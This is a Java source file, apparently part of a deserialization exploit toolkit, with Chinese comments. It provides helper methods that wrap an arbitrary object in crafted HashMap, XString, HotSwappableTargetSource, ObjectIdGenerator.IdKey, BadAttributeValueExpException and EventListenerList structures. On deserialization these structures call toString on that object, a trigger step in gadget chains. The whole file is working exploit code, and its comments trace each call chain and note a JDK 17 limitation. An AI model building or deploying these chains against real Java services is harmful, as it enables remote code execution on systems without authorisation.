package util;

import com.fasterxml.jackson.annotation.ObjectIdGenerator;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.swing.undo.UndoableEdit;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Vector;

import static util.GadgetUtils.makeMap;

public class TriggertoStringUtils {
    // HashMap#readObject-->xString#equals-->node#toString
    public static Object xString1(Object node) throws Exception {
        XString xString = new XString("Squirt1e");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",node);
        map1.put("zZ",xString);
        map2.put("yy",xString);
        map2.put("zZ",node);

        Object o = makeMap(map1,map2);
        return o;
    }

    // HashMap#readObject-->HotSwappableTargetSource#equals-->xString#equals-->node#toString
    // HotSwappableTargetSource实现hashCode方法，每个HotSwappableTargetSource对象的hash值都是一样的，并且重写的equals会继续调用target对象的equals方法。相当于一个中继2333
    public static Object xString2(Object node) throws Exception {
        XString xString = new XString("Squirt1e");
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(node);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(xString);
        HashMap map = new HashMap();
        map.put(hotSwappableTargetSource1,"");
        map.put(hotSwappableTargetSource2,"");
        return map;
    }

    // HashMap#readObject-->ObjectIdGenerator#equals-->xString#equals-->node#toString
    // ObjectIdGenerator这个类也有意思，hashCode方法返回this.hashCode;可以反射改；equals会调用toString
    public static Object xString3(Object node) throws Exception {
        XString xString = new XString("Squirt1e");
        ObjectIdGenerator.IdKey idKey1 = new ObjectIdGenerator.IdKey(Object.class,Object.class,xString);
        ObjectIdGenerator.IdKey idKey2 = new ObjectIdGenerator.IdKey(Object.class,Object.class,node);
        ReflectionUtils.setFieldValue(idKey1,"hashCode",0);
        ReflectionUtils.setFieldValue(idKey2,"hashCode",0);
        HashMap map = new HashMap();
        map.put(idKey1,"");
        map.put(idKey2,"");
        return map;
    }

    //jdk17不行, valObj.toString();
    public static Object badAttributeValue(Object node) throws Exception {
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, node);
        return val;
    }

    //  eventListenerList#readObject-->eventListenerList#add-->node#toString
    //  和hessian那个触发toString很像，抛出异常隐式调用object#toString：
    //  if (!t.isInstance(l)) {
    //            throw new IllegalArgumentException("Listener " + l +
    //                                         " is not of type " + t);
    //        }

    public static Object eventListenerList(Object obj) throws Exception {
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Field edits =  ReflectionUtils.getFuckField(manager.getClass(), "edits"); //oops cause the edits Field in UndoManager.superClass

        Vector vector = new Vector<>();
        vector.add(obj);

        edits.setAccessible(true);
        edits.set(manager, vector);
        ReflectionUtils.setFieldValue(list, "listenerList", new Object[]{Class.class, manager});
        return list;
    }
}
